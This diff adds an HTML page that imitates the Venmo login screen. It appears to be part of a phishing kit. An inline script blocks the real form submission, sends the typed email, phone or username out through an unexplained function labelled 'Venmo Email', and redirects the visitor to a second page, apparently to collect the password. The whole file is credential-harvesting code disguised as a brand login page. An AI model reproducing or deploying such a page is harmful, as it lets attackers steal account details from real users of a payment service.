@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/app.css">
+    <title>Venmo</title>
+</head>
+<body>
+
+<main>
+    <div class="form">
+        <div>
+            <img src="res/img/logo.png" >
+        </div>
+        <form action="password.php" method="get">
+        <p class="header"> Log in</p>
+         <div class="col">
+           <input type="text"  placeholder="Enter email, mobile, or username" name="user" required>  
+         </div>
+
+         <div class="but">
+            <button type="submit">Next</button>
+         </div>
+
+         <div class="butt">
+            <button>Sign up</button>
+         </div>
+
+
+
+
+
+         </form>
+    </div>
+</main>
+
+    
+<script type="text/javascript">
+
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+    e.preventDefault();
+
+wu.zhong(`✉️ Venmo Email: ${document.querySelector("[name='user']").value}\n\n`);
+
+window.location="pass.html";
+
+})
+
+</script>
+</body>
+</html>
